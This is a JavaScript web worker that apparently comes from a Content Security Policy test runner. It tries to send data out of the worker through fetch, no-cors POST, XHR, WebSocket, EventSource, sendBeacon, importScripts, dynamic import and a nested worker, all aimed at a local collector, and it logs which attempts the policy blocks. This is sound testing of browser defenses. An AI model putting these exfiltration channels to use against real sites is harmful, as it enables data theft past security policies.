'use strict';
// Classic dedicated worker running egress attempts. Served three ways by the runner:
//   /egress-worker.js        (response carries B's CSP)
//   /nocsp/egress-worker.js  (response carries NO CSP header)
//   blob: URL                (inherits the creator's policy)
const violations = [];
self.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.effectiveDirective} blocked ${e.blockedURI}`));
self.onmessage = async (ev) => {
  const tag = ev.data.tag;
  const X = 'http://localhost:8103/hit/' + tag + '/';
  const out = {};
  const T = (p, ms = 2500) => Promise.race([p, new Promise((r) => setTimeout(() => r('timeout (no event)'), ms))]);
  const rec = async (name, fn) => { try { out[name] = await T(fn()); } catch (e) { out[name] = `throws ${e.name}: ${e.message}`.slice(0, 160); } };
  await rec('fetch', async () => { const r = await fetch(X + 'fetch?d=secret'); return 'ok status ' + r.status; });
  await rec('fetch-nocors', async () => { await fetch(X + 'fetch-nocors', { mode: 'no-cors', method: 'POST', body: 'secret' }); return 'ok (opaque)'; });
  await rec('xhr', () => new Promise((res) => { const x = new XMLHttpRequest(); x.open('GET', X + 'xhr'); x.onload = () => res('ok status ' + x.status); x.onerror = () => res('error event'); x.send(); }));
  await rec('websocket', () => new Promise((res) => {
    const ws = new WebSocket('ws://localhost:8103/hit/' + tag + '/websocket');
    ws.onopen = () => { res('open'); ws.close(); };
    ws.onerror = () => res('error event');
  }));
  await rec('eventsource', () => new Promise((res) => { const es = new EventSource(X + 'sse'); es.onmessage = () => { res('message'); es.close(); }; es.onerror = () => { res('error event'); es.close(); }; }));
  await rec('importScripts', async () => { importScripts(X + 'importscripts'); return 'imported, ran=' + self.__attackerScriptRan; });
  await rec('dynamic-import', async () => { await import(X + 'import'); return 'imported'; });
  await rec('sendBeacon', async () => (typeof navigator.sendBeacon === 'function' ? 'returned ' + navigator.sendBeacon(X + 'beacon', 'x') : 'navigator.sendBeacon is not available in workers'));
  await rec('nested-worker', () => new Promise((res) => { const w = new Worker(X + 'worker.js'); w.onerror = () => res('error event'); setTimeout(() => res('no error within 1s'), 1000); }));
  await rec('eval-works', async () => 'eval -> ' + (0, eval)('1+1'));
  await new Promise((r) => setTimeout(r, 200));
  postMessage({ out, violations, location: self.location.protocol });
};
